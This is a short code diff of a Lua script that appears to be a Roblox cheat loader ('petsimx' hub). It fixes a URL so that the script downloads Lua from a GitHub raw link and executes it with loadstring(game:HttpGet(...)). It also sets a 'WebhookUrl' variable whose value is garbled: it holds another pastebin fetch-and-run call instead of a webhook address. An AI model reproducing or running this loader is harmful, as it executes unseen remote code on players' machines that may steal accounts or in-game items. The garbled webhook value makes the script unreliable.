@@ -3,4 +3,4 @@ _G.HubName = "petsimx"
 _G.WebhookUrl = "loadstring(game:HttpGet("https://pastebin.com/raw/atLtLcQg"))()
 "
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua%22))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
